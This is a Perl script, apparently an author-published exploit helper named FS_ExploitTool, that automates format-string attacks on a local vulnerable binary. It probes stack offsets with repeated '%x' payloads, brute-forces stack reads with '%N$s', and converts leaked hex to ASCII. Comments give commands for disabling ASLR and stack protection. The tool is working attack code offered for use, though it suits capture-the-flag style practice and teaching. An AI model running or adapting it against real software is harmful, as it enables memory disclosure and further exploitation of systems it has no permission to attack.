#!/usr/bin/perl -wU

# Modules:
use strict;
use Pod::Usage;
use Getopt::Long;
use Switch 'Perl6';
use Term::ANSIColor;

# Features:
use feature 'say';
use feature 'switch';

# Constants:
use constant MAX_LONG => 900;
use constant TRUE     => 1;
use constant FALSE    => 0;


# No stack cookies (not required):  gcc  -fno-stack-protector -o bin1 bin1.c
# No ASLR (not required):   echo 0 > /proc/sys/kernel/randomize_va_space
#
# Usage:
# ./FS_Offset_discovery.pl --verbose=1 --pattern=44434241 -b=bin1 --junk=ABCD
# 
# Flag example= 61-74617461-6c707968




my $result = GetOptions(
			'binary|b=s'  => \my $BinName,
			'verbose|v=i' => \my $Verbose, 
			'pattern|p=s' => \my $Pattern,
			'junk|j=s'    => \my $Junk,
			);
			
pod2usage(1) if(not defined($BinName && $Verbose));

$Pattern="41414141" if(not defined($Pattern));
$Junk="AAAAAA"      if(not defined($Junk));

my $GetOffset="%x";
my $Base;

# Check ASLR status: 
my $GetASLR = IO::File->new("/proc/sys/kernel/randomize_va_space", "r");
my $ASLRState = <$GetASLR> if(defined($GetASLR));
$GetASLR->close;
print colored("\n[*] Checking ASLR security ...",'green');

SWITCH:
given ($ASLRState) {
	when(0){       say colored(" No ASLR detected: have fun!",'bold green');}
	when(/1|2|3/){ say colored(" ASLR detected !",'bold yellow');}
	default{       say colored(" ASLR parameter: Not Found!",'bold red');}
}

MAIN_CODE:
if ($Verbose eq TRUE){

	for($Base=0;$Base <= MAX_LONG; $Base++){
		my $Exec=qx{./$BinName $Junk$GetOffset};
		say colored("-Trying with $Base format arguments... $BinName $Junk$GetOffset",'blue');

		say("- Current offsets: $Exec\n");
		
		last if($Exec =~ /$Pattern/gi);
		say colored("[-] No match found",'red');
		$GetOffset .= "%x-";
	}
	exit(FALSE) if($Base eq MAX_LONG);

	PATTERN_FOUND:
		PatternOk();
		OffsetExplore();
		BruteForceStack();
		SimpleHexAsciiConvertion();

}
elsif($Verbose eq FALSE ){
	
	for($Base=0;$Base <= MAX_LONG; $Base++){
		my $Exec=qx{./$BinName $Junk$GetOffset};
		last if($Exec =~ /$Pattern/gi);
		$GetOffset .= "%x-";
	}
	if($Base eq MAX_LONG){
		say colored("[-] No match found",'red');
		exit(FALSE);
	}

	PATTERN_FOUND:
		PatternOk();
		OffsetExplore();
		BruteForceStack();
		SimpleHexAsciiConvertion();
	

}



		#########################################
		#		Functions		#
		#########################################



sub SimpleHexAsciiConvertion{
	
	say("Do You want to convert hex data to ascii ? [Y|N]");
	my $Convert=<stdin>;
	chomp($Convert);

	if($Convert =~ /y/i){

		print colored("[+] Please enter pseudo offset or other hex value to convert (offset is the index value, see help for more informations): \n Hex: ",'blue');
		my $ToConvert=<stdin>;
		chomp($ToConvert);
		$ToConvert=~ s/[-]//g;
		die colored("What are ou trying to do ?? \n",'red') if(!($ToConvert));
		
		my $ConvertToAscii= pack "H*", "$ToConvert";
		$ConvertToAscii=reverse($ConvertToAscii);
		say colored ("- Converted data in ASCII (Little Endian's value must be reversed, see help for more informations): $ConvertToAscii\n",'yellow');
	}
}

	
sub BruteForceStack{
	
	say("Do You want to read stack value by bruteforce method ? [Y|N]");
	my $Bf=<stdin>;
	chomp($Bf);

	if($Bf =~ /y/i){
		for(my $Limit=0;$Limit <= 280;$Limit++){
			my $Dumping =qx{./$BinName $Junk%$Limit\\\$s};
			next if(not($Dumping) || $Dumping =~ /fault/);
			print colored("- Current value (limite: $Base) = ",'blue');
			say $Dumping;
		}
	}
}

sub OffsetExplore{
	
	say("Do You want to dump an offset data ? [Y|N]");
	my $ReadOffset=<stdin>;
	chomp($ReadOffset);
	
	say("Do You want to collect Offsets (very verbose!) ? [Y|N]");
	my $CollectOffset=<stdin>;
	chomp($CollectOffset);
	
	if($CollectOffset =~ /y/i){
		my $Collect=qx{./$BinName $Junk$GetOffset};
		
		die if(($Collect !~ /bf|08/) || (not($Collect))); 
		$Collect =~ s/-/ [OFFSETs] with index: $Base\n/g;
		say($Collect);
	}

	if($ReadOffset =~ /y/i){
		
		print colored("[+] Please enter offset to read (offset is the index value, see help for more informations): ",'blue');
		my $Offset=<stdin>;
		chomp($Offset);
		die colored("What are ou trying to do ?? \n",'red') if(!($Offset));
		my $DumpOffset =qx{./$BinName $Junk%$Offset\\\$s};
		say ("- Collected data (ascii): $DumpOffset\n");
	}
}

sub PatternOk{
	
	print colored("\n[+] Pattern found with $Base format arguments: \n    Payload used:\n",'green');
	my $NewBase=$Base-1;
	say ("$Junk$GetOffset\n");
	print colored("[+] Shortcut to get custom stack value: ./$BinName",'green');
	say colored(" $Junk"."AA"."%$NewBase\\\$"."x \n",'bold green');	
}
	
	
	
=info


[1] Description:

Tool developped for Format Strings (local) automation.
This Version permit you to collect a lot of infomations and to dump a lot of 
memory data bypassing ASLR (if any).


[2] Possibilities / Functions:

	- Check ASLR state
	- Build a payload start (with padding)
	- Collect all offsets in stack once index was found 
	- Dump an offset data (in ASCII)
	- Print all stack value (in ASCII) by bruteforce method
	- Convert hex data in ascii (for offset wich are data ;) )
	
[3] Parameters / Oprions:

This tool require parameters and uses some optional.

	- Required:
		
		- verbose (v) : booleans values 1 or 0 
		- binary  (b) : vulerable binary name

	- Optional:
		
		- junk    (j) : junk data like "AAAAA" used for adjustment (padding)
		- pattern (p) : pattern to match (like 41414141)
		
	- Default values:
		
		1) junk default    = AAAAAA
		2) pattern default = 41414141
		
[4] Example:

./FS_ExploitTool.pl --verbose=1 --pattern=414141 -b=bin2 --junk=AAAAAA

[5] FS_ExploitTool todo list:	

	- Build a full payload
	- Have choice between many possible payloads
	- Make it possible to exploit easily 

[6] Contact (to whip me \o/):
	
	-Emails:
		kmkz[at]tuxfamily[dot]org (for fun)
		mail[dot]bourbon[at]gmail[dot]com
	
	-Tweeter: kmkz_security
	-linkedin:
		[FR] linkedin.com/pub/jean-marie-bourbon/56/928/469
		[EN] linkedin.com/pub/jean-marie-bourbon/56/928/469/en
	-IRC nickname: kmkz
	

=cut


__END__
